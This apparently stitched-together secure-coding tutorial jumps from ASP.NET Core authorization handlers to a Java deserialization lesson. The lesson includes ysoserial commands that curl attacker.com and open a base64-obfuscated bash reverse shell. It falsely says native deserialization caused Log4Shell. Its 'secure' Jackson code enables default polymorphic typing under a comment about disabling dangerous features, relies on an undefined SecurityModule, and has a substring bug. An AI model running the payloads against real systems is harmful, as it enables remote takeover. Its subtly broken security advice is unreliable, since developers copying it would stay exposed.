**Key Security Controls**:
- `[Authorize]` attribute on controller requires authentication for ALL endpoints
- `[Authorize(Roles = "Admin")]` enforces role-based access at the server level
- Audit logging captures WHO performed sensitive actions
- Claims-based identity verification ties actions to authenticated users

For complex, resource-based authorization like department-scoped permissions, you need **Policy-Based Authorization** with custom handlers. Role-based authorization alone is too coarse-grained for these scenarios.

**PRODUCTION PATTERN**:

```csharp
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using System.Security.Claims;
using Microsoft.Extensions.Logging;
using System.Threading.Tasks;

namespace SecureApp.Authorization
{
    // Custom authorization requirement
    public class SameDepartmentRequirement : IAuthorizationRequirement { }
    public class ResourceOwnerRequirement : IAuthorizationRequirement { }

    // Handler for department-scoped access
    public class SameDepartmentHandler : AuthorizationHandler<SameDepartmentRequirement, User>
    {
        private readonly IUserRepository _userRepository;
        private readonly ILogger<SameDepartmentHandler> _logger;

        public SameDepartmentHandler(IUserRepository userRepository, ILogger<SameDepartmentHandler> logger)
        {
            _userRepository = userRepository;
            _logger = logger;
        }

        protected override Task HandleRequirementAsync(
            AuthorizationHandlerContext context,
            SameDepartmentRequirement requirement,
            User targetUser)
        {
            var currentUserId = context.User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
            var currentUser = _userRepository.GetById(int.Parse(currentUserId));

            // SuperAdmins bypass department check
            if (context.User.IsInRole("SuperAdmin"))
            {
                _logger.LogInformation("SuperAdmin {UserId} accessing cross-department resource", currentUserId);
                context.Succeed(requirement);
                return Task.CompletedTask;
            }

            // Managers can only access users in their department
            if (context.User.IsInRole("Manager") && 
                currentUser.DepartmentId == targetUser.DepartmentId)
            {
                _logger.LogInformation("Manager {UserId} accessing same-department user {TargetId}", 
                    currentUserId, targetUser.Id);
                context.Succeed(requirement);
            }
            else
            {
                _logger.LogWarning("Authorization DENIED: User {UserId} attempted cross-department access to {TargetId}",
                    currentUserId, targetUser.Id);
            }

            return Task.CompletedTask;
        }
    }

    // Handler for resource owner access (user can edit own profile)
    public class ResourceOwnerHandler : AuthorizationHandler<ResourceOwnerRequirement, User>
    {
        private readonly ILogger<ResourceOwnerHandler> _logger;

        public ResourceOwnerHandler(ILogger<ResourceOwnerHandler> logger)
        {
            _logger = logger;
        }

        protected override Task HandleRequirementAsync(
            AuthorizationHandlerContext context,
            ResourceOwnerRequirement requirement,
            User targetUser)
        {
            var currentUserId = context.User.FindFirst(ClaimTypes.NameIdentifier)?.Value;

            // Admin can edit anyone
            if (context.User.IsInRole("Admin") || context.User.IsInRole("SuperAdmin"))
            {
                _logger.LogInformation("Admin {UserId} editing user {TargetId}", currentUserId, targetUser.Id);
                context.Succeed(requirement);
                return Task.CompletedTask;
            }

            // Users can only edit their own profile
            if (currentUserId == targetUser.Id.ToString())
            {
                context.Succeed(requirement);
            }
            else
            {
                _logger.LogWarning("Authorization DENIED: User {UserId} attempted to edit user {TargetId}",
                    currentUserId, targetUser.Id);
            }

            return Task.CompletedTask;
        }
    }
}

namespace SecureApp.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    [Authorize]
    public class UsersController : ControllerBase
    {
        private readonly IUserRepository _userRepository;
        private readonly IAuthorizationService _authorizationService;
        private readonly ILogger<UsersController> _logger;

        public UsersController(
            IUserRepository userRepository,
            IAuthorizationService authorizationService,
            ILogger<UsersController> logger)
        {
            _userRepository = userRepository;
            _authorizationService = authorizationService;
            _logger = logger;
        }

        [HttpPut("{userId}")]
        public async Task<IActionResult> UpdateUser(int userId, [FromBody] UserUpdateDto dto)
        {
            var targetUser = _userRepository.GetById(userId);
            if (targetUser == null)
            {
                return NotFound();
            }

            // Resource-based authorization check
            var authResult = await _authorizationService.AuthorizeAsync(
                User, targetUser, "CanEditUser");

            if (!authResult.Succeeded)
            {
                _logger.LogWarning("Forbidden: User {CurrentUser} cannot edit user {TargetUser}",
                    User.FindFirst(ClaimTypes.NameIdentifier)?.Value, userId);
                return Forbid();
            }

            _userRepository.Update(userId, dto);
            return Ok(new { message = "User updated" });
        }

        [HttpDelete("{userId}")]
        [Authorize(Roles = "Manager,Admin,SuperAdmin")]
        public async Task<IActionResult> DeleteUser(int userId)
        {
            var targetUser = _userRepository.GetById(userId);
            if (targetUser == null)
            {
                return NotFound();
            }

            // Department-scoped authorization
            var authResult = await _authorizationService.AuthorizeAsync(
                User, targetUser, "SameDepartmentAccess");

            if (!authResult.Succeeded)
            {
                return Forbid();
            }

            _userRepository.DeleteUser(userId);
            return Ok(new { message = "User deleted" });
        }
    }
}

// Startup.cs / Program.cs configuration
namespace SecureApp
{
    public static class AuthorizationConfig
    {
        public static void ConfigureAuthorization(IServiceCollection services)
        {
            services.AddAuthorization(options =>
            {
                options.AddPolicy("CanEditUser", policy =>
                    policy.Requirements.Add(new ResourceOwnerRequirement()));

                options.AddPolicy("SameDepartmentAccess", policy =>
                    policy.Requirements.Add(new SameDepartmentRequirement()));

                // Fallback policy - require authentication for all endpoints
                options.FallbackPolicy = new AuthorizationPolicyBuilder()
                    .RequireAuthenticatedUser()
                    .Build();
            });

            // Register handlers
            services.AddScoped<IAuthorizationHandler, ResourceOwnerHandler>();
            services.AddScoped<IAuthorizationHandler, SameDepartmentHandler>();
        }
    }
}
```

**Defense in Depth Layers**:

1. **Authentication Layer**: `[Authorize]` ensures only authenticated users reach endpoints
```csharp
[Authorize] // Layer 1: Must be logged in
public class UsersController : ControllerBase { }
```

2. **Role-Based Layer**: Coarse-grained access control
```csharp
[Authorize(Roles = "Manager,Admin")] // Layer 2: Must have appropriate role
public async Task<IActionResult> DeleteUser(int userId) { }
```

3. **Resource-Based Layer**: Fine-grained, context-aware authorization
```csharp
// Layer 3: Must have permission for THIS specific resource
var authResult = await _authorizationService.AuthorizeAsync(User, targetUser, "SameDepartmentAccess");
if (!authResult.Succeeded) return Forbid();
```

**Additional Protections**:

- **Audit Trail**: All authorization decisions logged with user IDs and timestamps
- **Fail Secure**: Missing authorization handlers cause authorization to fail by default
- **Separation of Concerns**: Authorization logic isolated in handlers, not scattered through controllers
- **Centralized Policy Management**: All policies defined in one place for easy auditing
- **Rate Limiting**: Add rate limiting to prevent enumeration attacks:

```csharp
// In Program.cs
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("AdminEndpoints", opt =>
    {
        opt.Window = TimeSpan.FromMinutes(1);
        opt.PermitLimit = 100;
        opt.QueueLimit = 0;
    });
});
```

- **Security Headers**: Ensure API responses include security headers
- **Input Validation**: Validate all user IDs are positive integers before processing

Reading serialized Java objects directly from files is extremely dangerous - this is one of the most critical vulnerability classes in Java security, responsible for breaches like the Log4Shell incident that affected millions of systems.

**VULNERABLE CODE**:

```java
import java.io.*;

public class PreferencesLoader {

    public UserPreferences loadPreferences(String filename) throws Exception {
        FileInputStream fis = new FileInputStream(filename);
        ObjectInputStream ois = new ObjectInputStream(fis);

        // VULNERABLE: Deserializes ANY object without validation
        UserPreferences prefs = (UserPreferences) ois.readObject();

        ois.close();
        return prefs;
    }

    // Also vulnerable: accepting serialized data from network
    public Object receiveObject(InputStream networkStream) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(networkStream);
        return ois.readObject();  // RCE waiting to happen
    }
}
```

**Attack Payload** (using ysoserial tool):
```bash
# Generate malicious serialized payload using Commons Collections gadget chain
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > malicious.ser

# Or execute reverse shell
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' > shell.ser
```

**Why This Is Dangerous**:
- `ObjectInputStream.readObject()` instantiates objects and executes code during deserialization
- Attacker-controlled data can trigger "gadget chains" using classes in the classpath
- Code execution happens BEFORE the type cast, so checking types afterward is useless
- Common libraries like Apache Commons Collections, Spring, Jackson contain exploitable gadgets

**SECURE VERSION**:

```java
import java.io.*;
import java.util.Set;
import java.util.HashSet;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecurePreferencesLoader {
    private static final Logger logger = LoggerFactory.getLogger(SecurePreferencesLoader.class);

    // Whitelist of allowed classes for deserialization
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.model.UserPreferences",
        "java.lang.String",
        "java.lang.Integer",
        "java.util.HashMap",
        "java.util.ArrayList"
    );

    public UserPreferences loadPreferences(String filename) throws Exception {
        try (FileInputStream fis = new FileInputStream(filename);
             ValidatingObjectInputStream ois = new ValidatingObjectInputStream(fis)) {

            Object obj = ois.readObject();

            if (!(obj instanceof UserPreferences)) {
                logger.warn("Unexpected object type: {}", obj.getClass().getName());
                throw new SecurityException("Invalid preferences object");
            }

            return (UserPreferences) obj;
        }
    }

    // Custom ObjectInputStream that validates classes before deserializing
    private static class ValidatingObjectInputStream extends ObjectInputStream {

        public ValidatingObjectInputStream(InputStream in) throws IOException {
            super(in);
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) 
                throws IOException, ClassNotFoundException {
            String className = desc.getName();

            // Block dangerous classes before they're instantiated
            if (!ALLOWED_CLASSES.contains(className) && !className.startsWith("[")) {
                logger.error("Blocked deserialization of unauthorized class: {}", className);
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
            }

            return super.resolveClass(desc);
        }
    }
}
```

**Key Security Controls**:
- **Class Whitelist Filtering**: Only allow specific, known-safe classes to be deserialized by overriding `resolveClass()`
- **Validation Before Instantiation**: Block dangerous classes BEFORE `readObject()` creates instances and triggers gadget chains
- **Type Validation**: Explicitly verify the deserialized object type matches expectations

In production microservices, you should **avoid native Java serialization entirely**. Use type-safe serialization formats like JSON with strict schema validation. Here's a comprehensive production pattern:

**PRODUCTION PATTERN**:

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.json.JsonMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;
import org.springframework.web.bind.annotation.*;
import javax.validation.Valid;
import javax.validation.constraints.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import java.util.UUID;

@RestController
@RequestMapping("/api/v1/preferences")
public class SecurePreferencesController {
    private static final Logger logger = LoggerFactory.getLogger(SecurePreferencesController.class);
    private static final Logger auditLogger = LoggerFactory.getLogger("AUDIT");

    private final ObjectMapper secureMapper;
    private final PreferencesService preferencesService;

    public SecurePreferencesController(PreferencesService preferencesService) {
        this.preferencesService = preferencesService;
        this.secureMapper = createSecureObjectMapper();
    }

    private ObjectMapper createSecureObjectMapper() {
        // Strict type validator - only allow known types
        PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
            .allowIfBaseType(UserPreferencesDTO.class)
            .allowIfSubType("com.myapp.dto")
            .denyForExactBaseType(Object.class)  // Block Object.class polymorphism
            .build();

        return JsonMapper.builder()
            // Disable dangerous features
            .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
            .activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL)
            .build()
            // Block gadget chain classes
            .registerModule(new SecurityModule());
    }

    @PostMapping("/update")
    public ResponseEntity<ApiResponse> updatePreferences(
            @Valid @RequestBody UserPreferencesDTO preferencesDTO,
            @RequestHeader("X-Request-ID") String requestId,
            @AuthenticationPrincipal UserDetails user) {

        String correlationId = requestId != null ? requestId : UUID.randomUUID().toString();

        // Audit logging for compliance
        auditLogger.info("correlationId={} action=UPDATE_PREFERENCES userId={} ip={}",
            correlationId, user.getUsername(), getClientIp());

        try {
            // Validate DTO constraints
            validatePreferences(preferencesDTO);

            // Convert to domain object with explicit mapping (no reflection magic)
            UserPreferences prefs = mapToDomain(preferencesDTO, user.getUsername());

            preferencesService.save(prefs);

            return ResponseEntity.ok(new ApiResponse("success", correlationId));

        } catch (ValidationException e) {
            logger.warn("correlationId={} validation_failed={}", correlationId, e.getMessage());
            return ResponseEntity.badRequest().body(new ApiResponse("validation_error", correlationId));
        }
    }

    private UserPreferences mapToDomain(UserPreferencesDTO dto, String userId) {
        // Explicit field-by-field mapping - no automatic deserialization
        UserPreferences prefs = new UserPreferences();
        prefs.setUserId(userId);
        prefs.setTheme(sanitizeString(dto.getTheme(), 50));
        prefs.setLanguage(validateLanguageCode(dto.getLanguage()));
        prefs.setNotificationsEnabled(dto.isNotificationsEnabled());
        prefs.setTimezone(validateTimezone(dto.getTimezone()));
        return prefs;
    }

    private String sanitizeString(String input, int maxLength) {
        if (input == null) return null;
        return input.replaceAll("[^a-zA-Z0-9_-]", "").substring(0, Math.min(input.length(), maxLength));
    }
}

